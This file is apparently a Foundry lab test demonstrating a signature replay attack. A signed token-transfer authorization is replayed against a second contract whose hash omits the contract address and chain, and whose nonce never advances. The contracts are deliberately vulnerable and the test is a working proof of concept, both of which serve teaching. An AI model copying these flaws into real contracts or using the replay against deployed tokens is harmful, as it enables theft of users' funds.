// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    BenefittokenWhale BenefittokenWhaleContract;
    SixEyeHealthtoken SixEyeHealthtokenContract;
    address alice = vm.addr(1);
    address bob = vm.addr(2);

    constructor() {
        BenefittokenWhaleContract = new BenefittokenWhale();
        BenefittokenWhaleContract.CoveragetokenWhaleDeploy(address(this));
        BenefittokenWhaleContract.transferBenefit(alice, 1000);
        SixEyeHealthtokenContract = new SixEyeHealthtoken();
        SixEyeHealthtokenContract.CoveragetokenWhaleDeploy(address(this));
        SixEyeHealthtokenContract.transferBenefit(alice, 1000);
    }

    function testSignatureReplay() public {
        emit log_named_uint(
            "Balance",
            BenefittokenWhaleContract.benefitsOf(address(this))
        );

        bytes32 hash = keccak256(
            abi.encodePacked(
                address(alice),
                address(bob),
                uint256(499),
                uint256(1),
                uint256(0)
            )
        );
        emit log_named_bytes32("hash", hash);

        // The {r, s, v} signature can be combined into one 65-byte-long sequence: 32 bytes for r , 32 bytes for s , and one byte for v
        //r - a point on the secp256k1 elliptic curve (32 bytes)
        //s - a point on the secp256k1 elliptic curve (32 bytes)
        //v - recovery id (1 byte)

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);
        emit log_named_uint("v", v);
        emit log_named_bytes32("r", r);
        emit log_named_bytes32("s", s);

        address alice_address = ecrecover(hash, v, r, s);
        emit log_named_address("alice_address", alice_address);
        emit log_string(
            "If operator got the Alice's signature, the operator can replay this signature on the others contracts with same method."
        );
        vm.startPrank(bob);

        BenefittokenWhaleContract.movecoverageProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        // Bob successfully transferred funds from Alice.
        emit log_named_uint(
            "SET token balance of Bob",
            BenefittokenWhaleContract.benefitsOf(address(bob))
        );

        // Because we have nonce protect to replay, so we can not replay again in the same contract.
        // BTW this nonce start from 0, it's not a best practice.
        // TokenWhaleContract.transferProxy(address(alice),address(bob),499,1,v,r,s);
        // emit log_named_uint("Balance of Bob",TokenWhaleContract.balanceOf(address(bob)));

        emit log_string(
            "Try to replay to another contract with same signature"
        );
        emit log_named_uint(
            "Before the replay, SIX token balance of bob:",
            SixEyeHealthtokenContract.benefitsOf(address(bob))
        );

        SixEyeHealthtokenContract.movecoverageProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        emit log_named_uint(
            "After the replay, SIX token balance of bob:",
            SixEyeHealthtokenContract.benefitsOf(address(bob))
        );

        SixEyeHealthtokenContract.movecoverageProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        emit log_named_uint(
            "After the second replay, SIX token balance of bob:",
            SixEyeHealthtokenContract.benefitsOf(address(bob))
        );
    }
}

contract BenefittokenWhale is Test {
    address player;

    uint256 public fundTotal;
    mapping(address => uint256) public benefitsOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function CoveragetokenWhaleDeploy(address _player) public {
        player = _player;
        fundTotal = 2000;
        benefitsOf[player] = 2000;
    }

    function _assigncredit(address to, uint256 value) internal {
        benefitsOf[msg.sender] -= value;
        benefitsOf[to] += value;
    }

    function transferBenefit(address to, uint256 value) public {
        require(benefitsOf[msg.sender] >= value);
        require(benefitsOf[to] + value >= benefitsOf[to]);

        _assigncredit(to, value);
    }

    function movecoverageProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 nonce = nonces[_from];
        emit log_named_uint("nonce", nonce);
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            benefitsOf[_to] + _value < benefitsOf[_to] ||
            benefitsOf[msg.sender] + _feeUgt < benefitsOf[msg.sender]
        ) revert();
        benefitsOf[_to] += _value;

        benefitsOf[msg.sender] += _feeUgt;

        benefitsOf[_from] -= _value + _feeUgt;
        nonces[_from] = nonce + 1;
        return true;
    }
}

contract SixEyeHealthtoken is Test {
    address player;

    uint256 public fundTotal;
    mapping(address => uint256) public benefitsOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Six Eye Token";
    string public symbol = "SIX";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function CoveragetokenWhaleDeploy(address _player) public {
        player = _player;
        fundTotal = 2000;
        benefitsOf[player] = 2000;
    }

    function _assigncredit(address to, uint256 value) internal {
        benefitsOf[msg.sender] -= value;
        benefitsOf[to] += value;
    }

    function transferBenefit(address to, uint256 value) public {
        require(benefitsOf[msg.sender] >= value);
        require(benefitsOf[to] + value >= benefitsOf[to]);

        _assigncredit(to, value);
    }

    function movecoverageProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 nonce = nonces[_from];
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            benefitsOf[_to] + _value < benefitsOf[_to] ||
            benefitsOf[msg.sender] + _feeUgt < benefitsOf[msg.sender]
        ) revert();
        benefitsOf[_to] += _value;

        benefitsOf[msg.sender] += _feeUgt;

        benefitsOf[_from] -= _value + _feeUgt;
        return true;
    }
}
